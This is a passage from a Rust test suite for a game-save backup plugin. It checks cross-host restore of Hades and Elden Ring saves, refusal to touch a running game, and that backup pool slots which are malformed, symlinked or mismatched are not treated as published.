        assert_eq!((r.unchanged, r.errors.len()), (1, 0));
    }

    #[test]
    fn several_local_prefixes_for_one_game_defer_instead_of_guessing() {
        let t = TempDir::new();
        let (b, he) = homes(&t);
        let bf = Fixture::new(BRAGI, &b);
        bf.materialize();
        let mut hf = Fixture::new(HEMLOCK, &he);
        let game = hf.preview.games.get_mut("Hades").unwrap();
        let other = he.join(
            "Games/battlenet/drive_c/users/steamuser/Documents/Saved Games/Hades/Profile3.sav",
        );
        game.files
            .insert(other.display().to_string(), Default::default());
        hf.materialize();
        let (bh, hh) = (host(&t, "bragi", &b, &bf), host(&t, "hemlock", &he, &hf));
        let s1 = slot(&t, "hades", 1);
        backup_in(&bh, &s1, "hades").unwrap();
        let r = restore_in(&hh, &s1, "hades").unwrap();
        assert_eq!(
            r.deferred,
            vec!["wine-user: 2 local locations; not guessing".to_string()]
        );
    }

    #[test]
    fn steam_userdata_needs_one_known_account() {
        let t = TempDir::new();
        let (b, _) = homes(&t);
        let f = Fixture::new(BRAGI, &b);
        f.materialize();
        let h = host(&t, "bragi", &b, &f);
        let s1 = slot(&t, "elden-ring", 1);
        backup_in(&h, &s1, "elden-ring").unwrap();

        // A second account appears and ludusavi finds no userdata locally.
        let ud = b.join(".local/share/Steam/userdata");
        fs::create_dir_all(ud.join("99999")).unwrap();
        fs::remove_dir_all(ud.join("64751656/1245620")).unwrap();
        let mut gone = Fixture::new(BRAGI, &b);
        gone.preview
            .games
            .get_mut("ELDEN RING")
            .unwrap()
            .files
            .retain(|p, _| !p.contains("/userdata/"));
        let h = host(&t, "bragi", &b, &gone);
        let r = restore_in(&h, &s1, "elden-ring").unwrap();
        assert!(
            r.deferred
                .iter()
                .any(|d| d.starts_with("steam-userdata: no single")),
            "{:?}",
            r.deferred
        );

        // With the account's files found locally, that account is used.
        write(&ud.join("64751656/1245620/local/settings.cfg"), "local");
        let h = host(&t, "bragi", &b, &f);
        let r = restore_in(&h, &s1, "elden-ring").unwrap();
        assert!(r.deferred.is_empty(), "{:?}", r.deferred);
    }

    #[test]
    fn a_running_game_is_left_alone() {
        let t = TempDir::new();
        let (b, _) = homes(&t);
        let f = Fixture::new(BRAGI, &b);
        f.materialize();
        let mut h = host(&t, "bragi", &b, &f);
        let s1 = slot(&t, "hades", 1);
        backup_in(&h, &s1, "hades").unwrap();
        h.busy = |_| Some("pid 7 (Hades.exe)".into());
        assert!(
            backup_in(&h, &slot(&t, "hades", 2), "hades")
                .unwrap_err()
                .contains("running")
        );
        assert!(
            restore_in(&h, &s1, "hades")
                .unwrap_err()
                .contains("running")
        );
    }

    /// A pool slot with a core-shaped id (`YYYYMMDD-HHMMSS[-host][-N]`).
    fn slot_at(pool: &Path, instance: &str, id: &str) -> PathBuf {
        let p = pool.join(format!("{KIND}/{instance}/{id}/payload"));
        fs::create_dir_all(&p).unwrap();
        p
    }

    fn record(id: &str, kind: &str, instance: &str) -> String {
        serde_json::to_string(&BackupRecord {
            id: id.into(),
            kind: kind.into(),
            instance: instance.into(),
            created_ms: 1,
            path: PAYLOAD.into(),
            size_bytes: 0,
            file_count: 0,
            checksum: None,
            note: None,
            system: String::new(),
            writer: None,
        })
        .unwrap()
    }

    /// What the store's commit leaves: its record beside the payload, named
    /// by the slot.
    fn commit(payload: &Path, instance: &str) {
        let slot = payload.parent().unwrap();
        let id = slot.file_name().unwrap().to_str().unwrap();
        write(&slot.join(STORE_RECORD), &record(id, KIND, instance));
    }

    /// A copy of `src`'s payload under slot `id`, its manifest marked by `host`.
    fn decoy(src: &Path, id: &str, host: &str) -> PathBuf {
        let dst = src
            .parent()
            .unwrap()
            .parent()
            .unwrap()
            .join(id)
            .join(PAYLOAD);
        copy_tree(src, &dst);
        let mut m = Manifest::read(&dst).unwrap();
        m.host = host.into();
        m.write(&dst).unwrap();
        dst
    }

    fn copy_tree(src: &Path, dst: &Path) {
        fs::create_dir_all(dst).unwrap();
        for e in fs::read_dir(src).unwrap().flatten() {
            let to = dst.join(e.file_name());
            if e.file_type().unwrap().is_dir() {
                copy_tree(&e.path(), &to);
            } else {
                fs::copy(e.path(), &to).unwrap();
            }
        }
    }

    #[test]
    fn unchanged_is_judged_against_the_committed_pool_not_last() {
        let t = TempDir::new();
        let (b, _) = homes(&t);
        let f = Fixture::new(BRAGI, &b);
        f.materialize();
        let h = host(&t, "bragi", &b, &f);
        let pool = t.path().join("pool");

        let s1 = slot_at(&pool, "hades", "20261004-141750-bragi");
        assert!(!backup_in(&h, &s1, "hades").unwrap().unchanged);
        let s2 = slot_at(&pool, "hades", "20261004-141750-bragi-1");
        let out = backup_in(&h, &s2, "hades").unwrap();
        assert!(!out.unchanged, "the first slot was never committed");
        assert!(Manifest::read(&s2).is_ok());

        commit(&s2, "hades");
        let s3 = slot_at(&pool, "hades", "20261004-141751-bragi");
        let out = backup_in(&h, &s3, "hades").unwrap();
        assert!(out.unchanged);
        assert!(out.note.unwrap().contains("unchanged"));
        assert!(Manifest::read(&s3).is_err());
        assert_eq!(h.store.last("hades").unwrap(), Manifest::read(&s2).ok());

        write(&b.join(HADES_BRAGI), "more progress");
        assert!(!backup_in(&h, &s3, "hades").unwrap().unchanged);
    }

    #[cfg(unix)]
    #[test]
    fn only_slots_the_store_would_list_count_as_published() {
        use std::os::unix::fs::symlink;
        let t = TempDir::new();
        let (b, _) = homes(&t);
        let f = Fixture::new(BRAGI, &b);
        f.materialize();
        let h = host(&t, "bragi", &b, &f);
        let pool = t.path().join("pool");
        let good = slot_at(&pool, "hades", "20261004-141751-bragi");
        backup_in(&h, &good, "hades").unwrap();
        commit(&good, "hades");
        let want = Manifest::read(&good).ok();
        let next = slot_at(&pool, "hades", "20261004-141752-bragi");

        // Valid, but `-1` sorts below `-bragi` in the store's plain string order.
        commit(&decoy(&good, "20261004-141751-1", "older"), "hades");
        let dir_of = |p: &Path| p.parent().unwrap().to_path_buf();
        let rec = |p: &Path, json: &str| write(&dir_of(p).join(STORE_RECORD), json);
        let d = decoy(&good, "20261005-000000", "id-mismatch");
        rec(&d, &record("20261005-000001", KIND, "hades"));
        let d = decoy(&good, "20261005-000002", "other-instance");
        rec(&d, &record("20261005-000002", KIND, "elden-ring"));
        let d = decoy(&good, "20261005-000003", "other-kind");
        rec(&d, &record("20261005-000003", "host", "hades"));
        let d = decoy(&good, "20261005-000004", "invalid");
        rec(&d, "{not json");
        commit(&decoy(&good, ".orca-staging", "reserved"), "hades");
        let d = decoy(&good, "20261005-000005", "record-link");
        let outside = t.path().join("outside.json");
        write(&outside, &record("20261005-000005", KIND, "hades"));
        symlink(&outside, dir_of(&d).join(STORE_RECORD)).unwrap();
        let d = decoy(&good, "20261005-000006", "slot-link");
        commit(&d, "hades");
        let real = t.path().join("elsewhere/20261005-000006");
        fs::create_dir_all(real.parent().unwrap()).unwrap();
        fs::rename(dir_of(&d), &real).unwrap();
        symlink(&real, dir_of(&d)).unwrap();
        assert_eq!(latest_published(&next, "hades"), want);
        assert!(backup_in(&h, &next, "hades").unwrap().unchanged);

        // The newest valid slot alone decides: unreadable means publish.
        let newest = slot_at(&pool, "hades", "20261006-000000-hemlock");
        commit(&newest, "hades");
        assert_eq!(latest_published(&next, "hades"), None);
        let mut m = want.clone().unwrap();
        m.host = "hemlock".into();
        let mut raw = serde_json::to_vec(&m).unwrap();
        raw.resize(MANIFEST_MAX as usize + 1, b' ');
        fs::write(newest.join(MANIFEST_FILE), &raw).unwrap();
        assert_eq!(latest_published(&next, "hades"), None);
        copy_tree(&good.join(FILES_DIR), &newest.join(FILES_DIR));
        m.write(&newest).unwrap();
        assert_eq!(latest_published(&next, "hades"), Some(m));
        let not_payload = next.parent().unwrap().join("staging");
        assert_eq!(latest_published(&not_payload, "hades"), None);
    }

    #[test]
    fn a_published_manifest_missing_payload_files_is_republished() {
        let t = TempDir::new();
        let (b, _) = homes(&t);
        let f = Fixture::new(BRAGI, &b);
        f.materialize();
        let h = host(&t, "bragi", &b, &f);
        let pool = t.path().join("pool");
        let s1 = slot_at(&pool, "hades", "20261004-141750");
        backup_in(&h, &s1, "hades").unwrap();
        commit(&s1, "hades");
        let m = Manifest::read(&s1).unwrap();
        let e = &m.parts["wine-user"][0];
        let file = s1.join(FILES_DIR).join("wine-user").join(&e.relpath);

        fs::write(&file, "short").unwrap();
        let s2 = slot_at(&pool, "hades", "20261004-141751");
        assert!(!backup_in(&h, &s2, "hades").unwrap().unchanged);
        fs::remove_dir_all(&s2).unwrap();

        fs::remove_file(&file).unwrap();
        let s2 = slot_at(&pool, "hades", "20261004-141751");
        assert!(!backup_in(&h, &s2, "hades").unwrap().unchanged);
        assert_eq!(Manifest::read(&s2).unwrap().parts, m.parts);
    }

    #[test]
    fn deferred_parts_survive_an_unchanged_prune() {
        let t = TempDir::new();
        let (b, he) = homes(&t);
        let (bf, hf) = (Fixture::new(BRAGI, &b), Fixture::new(HEMLOCK, &he));
        bf.materialize();
        hf.materialize();
        let (bh, hh) = (host(&t, "bragi", &b, &bf), host(&t, "hemlock", &he, &hf));
        let pool = t.path().join("pool");
        let s1 = slot_at(&pool, "elden-ring", "20261004-141750-bragi");
        backup_in(&bh, &s1, "elden-ring").unwrap();
        commit(&s1, "elden-ring");
        let bragi_parts = Manifest::read(&s1).unwrap().parts;
        let r = restore_in(&hh, &s1, "elden-ring").unwrap();
        assert_eq!(r.deferred.len(), 2, "{:?}", r.deferred);

        // Same files as hemlock's last but not equal to it, so the unchanged
        // path adopts it as last and prunes blobs to it.
        commit(
            &decoy(&s1, "20261004-141751-bragi", "bragi-again"),
            "elden-ring",
        );
        let s2 = slot_at(&pool, "elden-ring", "20261004-141752-hemlock");
        assert!(backup_in(&hh, &s2, "elden-ring").unwrap().unchanged);
        assert_eq!(
            hh.store.last("elden-ring").unwrap().unwrap().host,
            "bragi-again"
        );

        let other = slot_at(
            &t.path().join("other-pool"),
            "elden-ring",
            "20261004-141753",
        );
        assert!(!backup_in(&hh, &other, "elden-ring").unwrap().unchanged);
        assert_eq!(Manifest::read(&other).unwrap().parts, bragi_parts);
    }

    #[test]
    fn kind_dispatches_through_the_toolkit_seam() {
        let v = plugin_toolkit::backup::dispatch_kind_op(
            &GameSavesKind,
            "layout",
            serde_json::json!({"instance": "hades"}),
        )
        .unwrap();
        assert_eq!(v, serde_json::json!(["game-saves", "hades"]));
        let v = plugin_toolkit::backup::dispatch_kind_op(
            &GameSavesKind,
            "title",
            serde_json::json!({}),
        )
        .unwrap();
        assert_eq!(v, serde_json::json!("Game saves"));
    }
}
